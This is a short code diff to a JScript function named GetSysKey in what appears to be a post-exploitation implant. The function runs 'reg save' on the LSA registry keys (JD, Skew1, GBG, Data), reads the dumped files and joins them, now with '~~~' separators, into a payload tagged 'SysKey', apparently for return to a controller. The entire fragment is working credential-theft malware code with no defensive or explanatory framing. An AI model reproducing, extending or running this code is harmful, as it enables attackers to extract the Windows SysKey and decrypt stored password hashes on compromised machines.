@@ -11,9 +11,9 @@ function GetSysKey()
     proton.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data" + " " + datapath + " /y", false);
 
     var data = proton.file.readBinary(jdpath);
-    data += proton.file.readBinary(skew1path);
-    data += proton.file.readBinary(gbgpath);
-    data += proton.file.readBinary(datapath);
+    data += "~~~"+proton.file.readBinary(skew1path);
+    data += "~~~"+proton.file.readBinary(gbgpath);
+    data += "~~~"+proton.file.readBinary(datapath);
 
     var headers = {};
     headers["Task"] = "SysKey";
